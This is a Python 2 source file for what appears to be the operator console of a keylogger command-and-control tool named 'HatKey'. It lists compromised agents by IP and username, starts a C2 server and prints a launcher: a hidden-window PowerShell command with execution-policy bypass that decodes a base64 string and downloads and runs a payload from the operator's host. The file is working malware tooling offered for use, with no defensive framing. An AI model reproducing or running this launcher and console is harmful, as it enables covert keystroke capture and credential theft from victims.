import sys
import os
import time
import threading
import base64
import re
from Lib import web
from Lib import prettytable
from System import Banner
from System import Global
from System.Colors import bcolors
from System.Server import server

class Command:
	COMMANDS 	= ['exit','show','help','set','run','list','kill']
	HELPCOMMANDS	= [
		['exit','Exit the console'],
		['list','List all agents'],
		['kill','Kill an agent'],
		['run','Run Command and Controler'],
		['help','Help menu'],
		['set','Sets a variable to a value'],
		['show','Show Command and Controler variables']
	]

	def help(self,args=None):
		table 	 = prettytable.PrettyTable([bcolors.BOLD + 'Command' + bcolors.ENDC,bcolors.BOLD + 'Description' + bcolors.ENDC])
		table.border = False
		table.align  = 'l'
		table.add_row(['-'*7,'-'*11])
		for i in self.HELPCOMMANDS:
			table.add_row([bcolors.OKBLUE +  i[0] + bcolors.ENDC,i[1]])
		print table

	def exit(self,args=None):
		os._exit(0)

	def list(self,args=None):
		table 	 = prettytable.PrettyTable([bcolors.BOLD + 'ID' + bcolors.ENDC, bcolors.BOLD + 'IP' + bcolors.ENDC, bcolors.BOLD + 'Username' + bcolors.ENDC])
		table.border = False
		table.align  = 'l'
		table.add_row(['-'*2,'-'*2,'-'*8])
		for i in Global.AGENTS:
			j = re.search('^([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})*', i).group()
			table.add_row([bcolors.OKBLUE +  i + bcolors.ENDC,j,i[len(j)+1:]])
		print table

	def kill(self,args):
		if(len(args) < 2):
			return None
		if(args[1] in Global.AGENTS):
			Global.AGENTS.remove(args[1])

	def run(self,args=None):
		flag = True
		for i in options:
			if(options[i][1] and options[i][0] == ''):
				print bcolors.FAIL + '[-]' + bcolors.ENDC + ' set ' + i
				flag = False
		if(flag):
			print bcolors.OKGREEN + '[+] Server start on: ' + bcolors.ENDC + ("http://%s:%s/")%(options['host'][0],options['port'][0])
			threading.Thread(target=server, args=(options['port'][0],options['host'][0],)).start()
			time.sleep(1)
			command = "powershell -exec bypass -WindowStyle Hidden IEX(IEX(\"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('"+base64.b64encode('(New-Object Net.WebClient).DownloadString("http://%s:%s/get_payload")'%(options['host'][0],options['port'][0]))+"'))\"))"
			print bcolors.OKGREEN + '[+] Keylogger launcher is: '+ bcolors.ENDC + '\n' +command
			

	def set(self,args):
		if(len(args) < 2):
			return None
		if(options.has_key(args[1])):
			options[args[1]][0] = args[2]

	def show(self,args=None):
		table 	 = prettytable.PrettyTable([bcolors.BOLD + 'Name' + bcolors.ENDC,bcolors.BOLD + 'Current Setting' + bcolors.ENDC,bcolors.BOLD + 'Required' + bcolors.ENDC,bcolors.BOLD + 'Description' + bcolors.ENDC])
		table.border = False
		table.align  = 'l'
		table.add_row(['-'*4,'-'*15,'-'*8,'-'*11])
		for i in options:
			table.add_row([bcolors.OKBLUE +  i + bcolors.ENDC,options[i][0],options[i][1],options[i][2]])
				
		print table 

agents	= list()
options = {
	'port'		:['8080'	,True	,'The Command and Controler port'],
	'host'		:[''		,True	,'The Command and Controler IP address']
	}


def main():
	Banner.Banner()
	Command().help()
	while True:
		input	= raw_input('HatKey > ').strip().split()
		if(input):
			if(input[0] in Command.COMMANDS):
				result = getattr(globals()['Command'](),input[0])(input)	

main()


		
	
